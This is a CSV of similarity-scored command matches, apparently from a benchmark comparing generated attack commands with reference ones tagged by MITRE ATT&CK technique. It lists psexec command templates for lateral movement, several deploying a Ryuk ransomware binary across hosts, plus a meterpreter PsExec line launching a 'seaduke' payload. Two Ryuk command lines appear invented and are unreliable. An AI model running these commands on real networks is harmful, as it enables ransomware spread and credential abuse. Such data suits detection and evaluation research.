file,tool,input_command,matched_command,chrf_score,match_found
command_psexec_TA0001_T1078.txt,psexec,"psexec \\example.com -u adminuser -c C:\path\to\malware.exe -a 1,2 -f","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",20.86,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -l -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",12.719,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -l -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",12.106,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -u <user-name> -p <password> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.596,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -u testuser -p Test123! -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",16.263,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -w <directory-path> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",15.161,True
command_psexec_TA0001_T1078.txt,psexec,psexec \\example.com -w C:\path\to\working\dir -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",15.435,True
command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -u <new_user_name> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.38,True
command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -s -u <new_system_account> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",17.453,True
command_psexec_TA0003_T1078.txt,psexec,"psexec \\remote-system -i -u <existing_admin_account> -p <password> -a 1,3","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",18.156,True
command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -c C:\path\to\executable.exe -u <existing_admin_account> -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.961,True
command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.998,True
command_psexec_TA0004_T1078.txt,psexec,psexec -u <new_user_name> -p <new_password> //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",18.989,True
command_psexec_TA0004_T1078.txt,psexec,"psexec -a 1,2 -c -i -l -s -v C:\path\to\new.exe //remote-system","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",15.99,True
command_psexec_TA0004_T1078.txt,psexec,psexec -e -f -i -n <timeout_seconds> -u <existing_user_name> -w C:\path\to\directory //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.168,True
command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u <new_user_name> -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.177,True
command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Administrator -p <password> -s -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.508,True
command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Administrator -p <password> -h,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",19.26,True
command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",23.994,True
command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",18.626,True
command_psexec_TA0008_T1021.txt,psexec,"psexec \\* -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",20.481,True
command_psexec_TA0008_T1021.txt,psexec,"psexec \\<host1> -s -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",13.137,True
command_psexec_TA0008_T1021.txt,psexec,"psexec @<list_of_hosts_file> -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",18.62,True
command_psexec_TA0008_T1021.txt,psexec,"psexec \\<host1> -e -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`",13.403,True
command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,49.836,True
command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,49.49,True
